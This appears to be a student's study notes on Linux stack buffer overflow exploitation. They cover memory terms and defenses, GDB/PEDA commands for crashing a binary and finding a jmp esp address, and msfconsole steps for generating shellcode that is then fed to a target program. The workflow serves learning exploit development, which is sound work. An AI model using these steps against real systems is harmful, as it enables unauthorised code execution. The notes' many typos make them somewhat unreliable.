############################################################################################################################################################################################################################

                                                                                      #Linux Exploit Development#

#####################################################################################################################################################################################################

strcpy (remember as vuln func)

#Buffer Overflow
    #Putting too much bite in a buffer space
        #overloading the buffer with data to crash the system
    #Commen Terms
        HEAP                              #Memory that can be allocated and deallocated
        STACK                             #A contiguous section of memory used for passing arguments
        REGISTERS                         #Storage elements as close as possible to the central processing unit (CPU)
        INTSTRUCTION POINTER (IP)         #a.k.a Program Counter (PC), contains the address of next instruction to be executed
        STACK POINTER (SP)                #Contains the address of the next available space on the stack
        BASE POINTER (BP)                 #The base of the stack
        FUNCTION                          #Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
        SHELLCODE                         #The code that is executed once an exploit successfully takes advantage of a vulnerability

    #Defenses
        #Non executable (NX) stack
        #Address Space Layout Randomization (ASLR)
        #Data Execution Prevention (DEP)
        #Stack Canaries
        #Position Independent Executable (PIE)
        
#GDB
    #Installation of Peda Plugin
        git clone https://github.com/longld/peda.git ~/peda
        echo "source ~/peda/peda.py" >> ~/.gdbinit
    #Common Commands
        disass <FUNCTION>     #Disassemble portion of the program
                 main         #all have main need to know for later
                                  #from that find other functions and keep breaking down more
        info <...>            #Supply info for specific stack areas
        x/256c $<REGISTER>    #Read characters from specific register
        break <address>       #Establish a break point
        gdb func              #opens gdb with fun we downloaded (opens gdb peds on linops
        run                   #runs program
                              #when overflow achieved will see signal SIGSEGV Segmentation Fault
        run <<< $(python lin_buf.py)
                              #runs exploit we created (lin_buf.py) to cause a bufer overslow
                              #find EIP (it tells how many characters we need to overflow the buffer (gives exact)
        
        env - gbd func        #opens just gbs not gdb peda
                              #need just gdb for steps listed under here
        show env              #shows two values we need to reset/unset
                                unset env LINES
                                unset env COLUMNS
                #run program and crah with bunch of a's
        info proc map         #must be run after crashing with buffer overflow
                #search for jump esp in locations from first address after heap to the bottom of the stack
        find /b 0xf7de1000 , 0xffffe000, 0xff, 0xe4
                <change with dif addrs>  <never change>
                #highlight first like 5-6 addrs given
                #when adding addrs to script need to azdd in reverse order like below
                    "\xfb\x45\xf6\xf7" was 0xf7f645fb
        
        #run msfconsole
        use payload /linux/x86/exec
        show options
        set CMD whoami
        show options
        generate -b "\x00" -f python
                #copy shell code at bottom (all buf = )
                
        sudo ./inventory.exe <<< $(python lin_buf.py)
#A buffer overflow pattern generator 
https://wiremask.eu/tools/buffer-overflow-pattern-generator/












